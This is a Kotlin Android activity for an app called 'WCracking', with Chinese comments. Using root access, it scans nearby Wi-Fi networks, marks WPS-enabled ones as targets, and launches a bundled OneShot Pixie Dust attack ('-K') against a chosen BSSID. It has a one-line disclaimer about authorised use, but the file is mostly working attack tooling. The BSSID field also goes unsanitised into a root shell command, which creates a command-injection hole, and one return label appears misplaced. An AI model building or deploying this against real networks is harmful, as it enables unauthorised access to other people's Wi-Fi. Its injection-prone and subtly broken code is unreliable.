package com.wcracking.app

import android.os.Bundle
import android.view.View
import android.widget.AdapterView
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.ListView
import android.widget.ScrollView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import com.topjohnwu.superuser.Shell
import java.io.File

/**
 * WCracking 原生 APK 壳。
 *
 * 职责：检查 root → 释放内置 OneShot 脚本 → 扫描 WPS 网络（解析 iw 结果成可点选列表）
 *       → 通过 root shell 调用 OneShot 完成 WPS 攻击，并回显输出。
 *
 * 前置条件（见 android/README.md）：
 *   - 已 root（Magisk/KernelSU）
 *   - 已安装 Termux，并 pkg install python wpa-supplicant pixiewps iw openssl
 *
 * 仅限对本人拥有或已获书面授权的网络进行安全审计。
 */
class MainActivity : AppCompatActivity() {

    private lateinit var etBssid: EditText
    private lateinit var lvScan: ListView
    private lateinit var tvLog: TextView
    private lateinit var scroll: ScrollView
    private lateinit var btnScan: Button
    private lateinit var btnAttack: Button

    private val scanResults = mutableListOf<ScanResult>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etBssid = findViewById(R.id.et_bssid)
        lvScan = findViewById(R.id.lv_scan)
        tvLog = findViewById(R.id.tv_log)
        scroll = findViewById(R.id.scroll_log)
        btnScan = findViewById(R.id.btn_scan)
        btnAttack = findViewById(R.id.btn_attack)

        // 检查 root（libsu 6.x 回调式 API）
        Shell.getShell { shell ->
            runOnUiThread {
                appendLog(if (shell.isRoot) "[+] 已获取 root" else "[-] 未获取 root（WPS 攻击需要 root）")
            }
        }

        // 释放内置脚本
        runCatching { extractAssets() }
            .onSuccess { appendLog("[*] 内置 OneShot 脚本已释放") }
            .onFailure { appendLog("[x] 释放脚本失败: ${it.message}") }

        // 扫描列表点击 → 填入 BSSID
        lvScan.onItemClickListener = AdapterView.OnItemClickListener { _, _, position, _ ->
            if (position in scanResults.indices) {
                val r = scanResults[position]
                etBssid.setText(r.bssid)
                appendLog("[*] 已选中 ${r.bssid}（SSID: ${r.ssid.ifBlank { "?" }}）")
            }
        }

        btnScan.setOnClickListener { scan() }
        btnAttack.setOnClickListener { attack() }
    }

    private fun extractAssets() {
        for (name in listOf("oneshot.py", "vulnwsc.txt")) {
            val dest = File(filesDir, name)
            if (!dest.exists()) {
                assets.open(name).use { input ->
                    dest.outputStream().use { output -> input.copyTo(output) }
                }
            }
        }
    }

    private fun pythonPath(): String {
        // 优先 Termux 的 python3，其次系统 PATH 里的 python3
        val termux = "/data/data/com.termux/files/usr/bin/python3"
        val r = Shell.cmd("command -v $termux").exec()
        return if (r.isSuccess && r.out.isNotEmpty()) termux else "python3"
    }

    private fun scan() {
        appendLog("[*] 扫描 WPS 网络（iw dev wlan0 scan）……")
        val lines = mutableListOf<String>()
        runRoot("iw dev wlan0 scan", onLine = { lines.add(it) }, onDone = { code ->
            if (code != 0 && lines.isEmpty()) {
                appendLog("[-] 扫描失败（退出码 $code），请确认已关系统 Wi-Fi 且 root 正常")
                return@runOnUiThread
            }
            val results = parseScan(lines)
            scanResults.clear()
            scanResults.addAll(results)
            val adapter = ArrayAdapter(
                this, android.R.layout.simple_list_item_1,
                results.map {
                    val wpsTag = if (it.wps) "[WPS] " else ""
                    "$wpsTag${it.ssid.ifBlank { "(隐藏SSID)" }} (${it.bssid})"
                }
            )
            lvScan.adapter = adapter
            appendLog("[+] 扫描完成，共 ${results.size} 个网络（含 WPS 标记的为易受攻击目标）")
        })
    }

    /** 解析 `iw dev wlan0 scan` 输出，提取 BSSID / SSID / 是否开启 WPS。 */
    private fun parseScan(lines: List<String>): List<ScanResult> {
        val results = mutableListOf<ScanResult>()
        var curBssid: String? = null
        var curSsid = ""
        var curWps = false
        fun flush() {
            if (curBssid != null) results.add(ScanResult(curBssid!!, curSsid, curWps))
        }
        for (raw in lines) {
            val line = raw.trim('\t', ' ')
            val mBss = Regex("BSS (\\S+)( )?\\(on \\w+\\)").find(line)
            if (mBss != null) {
                flush()
                curBssid = mBss.groupValues[1].uppercase()
                curSsid = ""
                curWps = false
                continue
            }
            val mSsid = Regex("SSID: (.*)").find(line)
            if (mSsid != null) {
                curSsid = mSsid.groupValues[1]
                continue
            }
            if (line.contains("WPS:") && line.contains("Version:")) {
                curWps = true
            }
        }
        flush()
        return results
    }

    private fun attack() {
        val bssid = etBssid.text.toString().trim()
        if (bssid.isEmpty()) {
            appendLog("[!] 请先输入或从扫描列表点选目标 BSSID")
            return
        }
        val python = pythonPath()
        val script = File(filesDir, "oneshot.py").absolutePath
        val vuln = File(filesDir, "vulnwsc.txt").absolutePath
        val cmd = "$python $script -i wlan0 -b $bssid --vuln-list $vuln -K"

        appendLog("[*] 开始 Pixie Dust 攻击 $bssid ……")
        appendLog("[*] $cmd")
        btnAttack.isEnabled = false
        runRoot(cmd, onLine = { appendLog(it) }, onDone = { code ->
            btnAttack.isEnabled = true
            appendLog(if (code == 0) "[+] 攻击结束" else "[-] 攻击结束（退出码 $code）")
        })
    }

    /** 在后台线程执行 root 命令，逐行回显。 */
    private fun runRoot(cmd: String, onLine: (String) -> Unit = {}, onDone: (Int) -> Unit = {}) {
        Thread {
            val result = Shell.cmd(cmd).exec()
            val out = result.out
            runOnUiThread {
                out.forEach(onLine)
                onDone(result.code)
            }
        }.start()
    }

    private fun appendLog(msg: String) {
        tvLog.append(msg + "\n")
        scroll.post { scroll.fullScroll(ScrollView.FOCUS_DOWN) }
    }

    private data class ScanResult(val bssid: String, val ssid: String, val wps: Boolean)
}
